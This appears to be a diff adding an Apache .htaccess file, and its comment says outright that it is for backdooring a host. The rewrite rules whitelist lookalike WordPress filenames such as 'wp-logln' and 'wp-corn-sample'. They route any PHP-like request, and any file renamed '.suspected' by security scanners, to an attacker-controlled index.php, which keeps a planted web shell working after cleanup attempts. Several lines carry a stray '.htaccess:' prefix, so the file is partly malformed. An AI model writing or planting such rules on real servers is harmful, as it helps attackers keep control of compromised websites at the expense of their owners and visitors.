@@ -1,0 +1,16 @@
+# filename .htaccess
+# Purpose - If you are backdooring a host you can force it to load whatdver script you want, in this case we force index.php
+
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+.htaccess:RewriteBase /
+.htaccess:RewriteRule ^(index|wp\-admin|wp\-include|wp\-comment|wp\-loader|wp\-corn\-sample|wp\-logln|output|about|admin|randkeyword|readurl|wp\-ver).php$ - [L]
+.htaccess:RewriteRule ^.*\.[pP][hH].* index.php [L]
+.htaccess:RewriteRule ^.*\.[sS][uU][sS][pP][eE][cC][tT][eE][dD] index.php [L]
+.htaccess:RewriteCond %{REQUEST_FILENAME} !-f
+.htaccess:RewriteCond %{REQUEST_FILENAME} !-d
+.htaccess:RewriteRule . index.php [L]
+.htaccess:</IfModule>
+
+  
